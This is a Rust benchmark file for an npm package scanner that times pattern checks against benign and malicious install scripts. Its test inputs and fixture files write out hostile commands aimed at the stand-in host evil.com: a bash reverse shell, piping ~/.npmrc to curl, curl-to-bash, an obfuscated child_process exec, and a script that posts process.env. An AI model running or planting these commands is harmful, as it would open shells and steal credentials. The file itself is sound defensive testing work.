#![allow(clippy::unwrap_used, clippy::expect_used)]

use criterion::{black_box, criterion_group, criterion_main, Criterion};
use sanctum_sentinel::npm::scanner::{check_patterns, scan_package};
use std::fs;

fn bench_check_patterns_benign(c: &mut Criterion) {
    c.bench_function("check_patterns/benign_script", |b| {
        b.iter(|| check_patterns(black_box("echo hello && npm run build"), "scripts.test"));
    });
}

fn bench_check_patterns_reverse_shell(c: &mut Criterion) {
    c.bench_function("check_patterns/reverse_shell", |b| {
        b.iter(|| {
            check_patterns(
                black_box("bash -i >& /dev/tcp/evil.com/4444 0>&1"),
                "scripts.postinstall",
            )
        });
    });
}

fn bench_check_patterns_credential_theft(c: &mut Criterion) {
    c.bench_function("check_patterns/credential_theft", |b| {
        b.iter(|| {
            check_patterns(
                black_box("cat ~/.npmrc | curl -X POST http://evil.com/steal"),
                "scripts.preinstall",
            )
        });
    });
}

fn bench_check_patterns_obfuscated(c: &mut Criterion) {
    c.bench_function("check_patterns/obfuscated_payload", |b| {
        b.iter(|| {
            check_patterns(
                black_box(
                    r#"node -e "require('child_process').exec(Buffer.from('Y3VybA==','base64').toString())"#,
                ),
                "scripts.postinstall",
            )
        });
    });
}

fn bench_check_patterns_long_script(c: &mut Criterion) {
    // Simulate a long, mostly-benign script with one malicious pattern at the end
    let mut content = "echo step1 && npm run lint && npm run test && echo done && ".repeat(50);
    content.push_str("curl http://evil.com | bash");

    c.bench_function("check_patterns/long_script_with_tail_payload", |b| {
        b.iter(|| check_patterns(black_box(&content), "scripts.postinstall"));
    });
}

fn bench_scan_package_benign(c: &mut Criterion) {
    let dir = tempfile::tempdir().expect("tempdir");
    fs::write(
        dir.path().join("package.json"),
        r#"{
            "name": "clean-package",
            "version": "1.0.0",
            "scripts": {
                "test": "jest",
                "build": "tsc",
                "start": "node dist/index.js"
            }
        }"#,
    )
    .expect("write");

    c.bench_function("scan_package/benign", |b| {
        b.iter(|| scan_package(black_box(dir.path())));
    });
}

fn bench_scan_package_malicious(c: &mut Criterion) {
    let dir = tempfile::tempdir().expect("tempdir");
    fs::write(
        dir.path().join("package.json"),
        r#"{
            "name": "evil-package",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "bash -i >& /dev/tcp/evil.com/4444 0>&1",
                "postinstall": "node -e \"require('child_process').exec('curl http://evil.com/steal | sh')\"",
                "install": "cat ~/.npmrc | curl -X POST http://evil.com"
            }
        }"#,
    )
    .expect("write");

    c.bench_function("scan_package/malicious_lifecycle_scripts", |b| {
        b.iter(|| scan_package(black_box(dir.path())));
    });
}

fn bench_scan_package_with_script_file(c: &mut Criterion) {
    let dir = tempfile::tempdir().expect("tempdir");
    let scripts_dir = dir.path().join("scripts");
    fs::create_dir_all(&scripts_dir).expect("mkdir");
    fs::write(
        scripts_dir.join("install.js"),
        r"
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// Exfiltrate environment
const data = JSON.stringify(process.env);
https.request({hostname: 'evil.com', path: '/collect', method: 'POST'}, () => {}).end(data);
",
    )
    .expect("write script");

    fs::write(
        dir.path().join("package.json"),
        r#"{
            "name": "pkg-with-script-file",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "node scripts/install.js"
            }
        }"#,
    )
    .expect("write");

    c.bench_function("scan_package/with_script_file_reference", |b| {
        b.iter(|| scan_package(black_box(dir.path())));
    });
}

criterion_group!(
    benches,
    bench_check_patterns_benign,
    bench_check_patterns_reverse_shell,
    bench_check_patterns_credential_theft,
    bench_check_patterns_obfuscated,
    bench_check_patterns_long_script,
    bench_scan_package_benign,
    bench_scan_package_malicious,
    bench_scan_package_with_script_file,
);
criterion_main!(benches);
